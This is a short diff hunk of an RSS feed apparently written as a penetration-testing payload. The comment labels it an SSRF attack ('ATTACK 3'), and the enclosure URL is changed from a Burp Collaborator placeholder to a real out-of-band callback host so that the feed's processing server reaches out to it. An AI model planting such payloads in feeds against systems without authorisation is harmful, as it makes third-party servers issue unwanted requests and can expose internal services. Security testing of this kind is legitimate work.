@@ -26,7 +26,7 @@
 
       <!-- ATTACK 3: SSRF via Enclosure -->
       <!-- The server might try to download this to check file size -->
-      <enclosure url="http://YOUR_BURP_COLLABORATOR.oastify.com/enclosure_test.mp3" length="1234" type="audio/mpeg" />
+      <enclosure url="phsrenjcxgefqbuibhlmmzh9nflr3gcop.oast.fun/enclosure_test.mp3" length="1234" type="audio/mpeg" />
     </item>
   </channel>
 </rss>
